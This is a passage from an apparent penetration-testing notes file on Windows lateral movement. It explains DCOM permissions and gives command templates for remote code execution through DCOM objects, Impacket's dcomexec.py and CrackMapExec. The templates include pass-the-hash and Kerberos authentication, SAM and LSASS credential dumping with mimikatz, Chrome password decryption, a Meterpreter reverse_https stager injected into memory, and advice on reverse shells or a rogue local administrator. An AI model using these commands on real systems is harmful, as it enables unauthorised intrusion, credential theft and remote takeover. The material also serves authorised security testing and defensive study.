  centralized location in the registry (`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\
  AppID\{<APPID>}`).

The configuration defined in `AppID` notably specify, the form of `Access
Control List (ACL)`, the following permissions:
   - `Launch Permissions`, that restrict the security principals that can
   locally or remotely start
   the `DCOM object` server
   - `Access Permissions`, that restrict the security principals that can
   locally or remotely access the `DCOM object` methods
   - `Configuration Permissions`, that restrict the security principals that
   can modify the configuration of the `DCOM` objects.

If the `Access Permissions` is left specified in the `AppID` configuration, the
system-wide `Access Permissions` are applied. By default, the `Remote Access`
right is only granted to the Windows local built-in `Administrators` group.
The `AppID` registered on a system can be browsed and edited using the
`dcomcnfg.exe` Windows built-in utility or, the dedicated `OleViewDotNet` .NET
utility.

A client request the instantiation of a remote `DCOM` object class by
specifying its `CLSID` or `ProgID`, the later being resolved to the associated
`CLSID`. The `DCOMLaunch` service (`C:\Windows\system32\svchost.exe -k
DcomLaunch`, for `DCOM objects` from an `exe` binary) or `DLLHOST.exe` (for
`DCOM objects` from a `DLL`) then instantiate the requested `DCOM` object
class, on condition that the client has the necessary access permissions (as
defined in the `APPID` configuration). The error code `80070005` (for
`E_ACCESSDENIED`) will be returned otherwise.

PowerShell can be used to list the `CLSID` and `ProdID` properties of the
`DCOM objects` registered on the local computer `HKEY_CLASSES_ROOT` registry
hive. The `HKEY_CLASSES_ROOT` registry hive cannot be directly accessed on a
remote computer using `Get-ChildItem`. In order to remotely access the
`HKEY_CLASSES_ROOT` registry hive, the following PowerShell commands can be
run over `WinRM` using the `Invoke-Command` PowerShell cmdlet.  

```
# Lists
Get-ChildItem REGISTRY::HKEY_CLASSES_ROOT\CLSID | ForEach-Object {

  $DCOMClass = New-Object PSObject -Property @{
    CLSID = $_.Name.Split("{")[1].Split("}")[0]
  }

  If ($_.GetSubKeyNames() -match "ProgID") {
    $DCOMClass | Add-Member -Type NoteProperty -Name "ProgID" -Value $_.OpenSubKey("ProgID").GetValue("")
  }

  Else {
    $DCOMClass | Add-Member -Type NoteProperty -Name "ProgID" -Value $null
  }

  return $DCOMClass
}

# Filters by ProgID
Get-ChildItem REGISTRY::HKEY_CLASSES_ROOT\CLSID -Recurse -Include 'ProgID' | ForEach-Object { If ($_.GetValue("") -match "<PROGID>") { return $_.Name,$_.GetValue("") }}

# Filter by CLSID
Get-ChildItem REGISTRY::HKEY_CLASSES_ROOT\CLSID -Recurse | ForEach-Object { If ($_.Name -match "<CLSID>") { return $_.Name,$_.GetValue("") }}
```

Multiple `DCOM objects` classes can be leveraged to execute commands on the
remote system. The idea of using `DCOM objects` for lateral movements having
come to light recently, in January 2017 after a publication by `enigma0x3`, the
below list, mostly gathered from
`https://www.cybereason.com/blog/dcom-lateral-movement-techniques`, is possibly
far from being exhaustive.

PowerShell and `Impacket`'s `dcomexec.py` Python script can be used to execute
commands through `DCOM` objects:

```
# PowerShell
# MMC20.Application
# Blocked by the default Windows firewall rules
# Starts a child process under Microsoft Management Console (mmc.exe)
$dcom = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("<C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | BINARY>", $null, <$null | "COMMAND_ARGS">, "7")

# ShellWindows
# Blocked by the default Windows firewall rules
# Requires a File Explorer or Internet Explorer process on the remote system
$dcom = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "<IP¨>"))
$dcom[0].Document.Application.ShellExecute("<BINARY>")
$dcom[0].Document.Application.ShellExecute("<BINARY>", "<COMMAND_ARGS>", "<EXEC_DIRECTORY>", $null, 0)

# ShellBrowserWindow
# Blocked by the default Windows firewall rules
# DOES NOT require a File Explorer or Internet Explorer process on the remote system
# Only available on
$dcom = [activator]::CreateInstance([type]::GetTypeFromCLSID("c08afd90-f2a1-11d1-8455-00a0c91f3880", "<IP¨>"))
$dcom.Document.Application.ShellExecute("<BINARY>")
$dcom.Document.Application.ShellExecute("<BINARY>", "<COMMAND_ARGS>", "<EXEC_DIRECTORY>", $null, 0)

# Outlook through Shell.Application
# Blocked by the default Windows firewall rules?
# Requires Outlook to be installed on the remote system
$dcom = [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application", "<IP¨>"))
$dcom_shell = $dcom.CreateObject("Shell.Application")
$dcom_shell.ShellExecute("<BINARY>")
$dcom_shell.ShellExecute("<BINARY>", "<COMMAND_ARGS>", "<EXEC_DIRECTORY>", $null, 0)

# Excel.Application DDE
# Blocked by the default Windows firewall rules?
# Requires Excel to be installed on the remote system
# The name of the specified binary is limited to 8 characters maximum, so a binary present in the %PATH%, such as powershell.exe or cmd.exe, must be used
$dcom = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","<IP>"))
$dcom.DisplayAlert = $False
$dcom.DDEInitiate("<BINARY>","<COMMAND_ARGS>")

# Python
# dcomexec.py executes by default a semi-interactive shell using the ShellBrowserWindow DCOM oject.
# NTLM authentication
dcomexec.py -debug [-object <MMC20 | ShellWindows | ShellBrowserWindow>] [-target-ip <TARGET_IP>] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> <TASK_COMMAND>
dcomexec.py -debug [-object <MMC20 | ShellWindows | ShellBrowserWindow>] -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> <TASK_COMMAND>

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
dcomexec.py -debug [-object <MMC20 | ShellWindows | ShellBrowserWindow>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> "<COMMAND | TASK_COMMAND>"

# More Microsoft Office DCOM objects can be leveraged for lateral movements, as described in the provided source above
```

###### [Over SMB / WMI / DCOM / WinRM / MSSQL / SSH / HTTP] CrackMapExec

`CrackMapExec` is a "Swiss army knife for pentesting Windows / Active Directory
environments" that wraps around multiples `Impacket` modules.

`CrackMapExec` can be used to test credentials and execute commands through
`SMB`, `WinRM`, `MSSQL`, `SSH`, `HTTP` services.

Over `SMB`, `CrackMapExec` supports different command execution methods:
  - (Default) `wmiexec` executes commands via `WMI`
  - `smbexec` executes commands by creating and running a service, similarly to
  the `PsExec` utility
  - `atexec` executes commands by remotely scheduling a task with through the
  Windows task scheduler
  - `mmcexec` executes commands over the `MMC20.Application` `DCOM` object

```
# As of December 2018, crackmapexec does not provides an option to output to a file.
# The tee utility can be used to both display and store to a file the crackmapexec standard output
# crackmapexec <[...]> | tee <OUTPUT_FILE>

# <TARGET | TARGETS> - can be IP(s), range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containing a list of targets
crackmapexec <smb | winrm | ssh | mssql | http> <TARGET | TARGETS> [-M <MODULE> [-o <MODULE_OPTION>]] (-d <DOMAIN> | --local-auth) -u <USERNAME | USERNAMES_FILE> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>) [--sam] [-x <COMMAND> | -X <PS_COMMAND>]
```

Additionally, `CrackMapExec` includes multiples modules that can be used for
post-exploitation:

```
crackmapexec --list-modules

[*] empire_exec          Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] mimikittenz          Executes Mimikittenz
[*] rundll32_exec        Executes a command using rundll32 and Windows's native javascript interpreter
[*] com_exec             Executes a command using a COM scriptlet to bypass whitelisting
[*] tokenrider           Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials
[*] tokens               Enumerates available tokens using Powersploit's Invoke-TokenManipulation
[*] mimikatz             Executes PowerSploit's Invoke-Mimikatz.ps1 script
[*] powerview            Wrapper for PowerView's functions
[*] shellinject          Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
[*] enum_chrome          Uses Powersploit's Invoke-Mimikatz.ps1 script to decrypt saved Chrome passwords
[*] metinject            Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
[*] peinject             Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script
[*] eventvwr_bypass      Executes a command using the eventvwr.exe fileless UAC bypass
```

`CrackMapExec` notable modules usage:

```
# SAM
crackmapexec <TARGETS> --sam (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# LSASS dump
crackmapexec <TARGETS> -M mimikatz (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# Meterpreter
# msf > use multi/handler
# msf exploit(handler) > set payload windows/meterpreter/reverse_https
crackmapexec <TARGETS> -M metinject -o LHOST=<HOST> LPORT=<PORT> -d <DOMAIN> -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
```

Note that:

  - The `--lsa` option dumps LSA secrets which can't be used in `Pass-the-Hash`
  attack and are harder to crack.
  - The `<TARGET>` and `<MODULE>` should be specified before the credentials as
    a `CrackMapExec` bug could skip the targets / module otherwise.
  - If the targeted host is unreachable, `CrackMapExec` may exit with out
    returning any error message.
  - In case the metinject fails, a local administrator can be added for RDP
    access or a powershell reverse shell injected in memory instead (refer to
    the `[General] Shells - PowerShell` note).
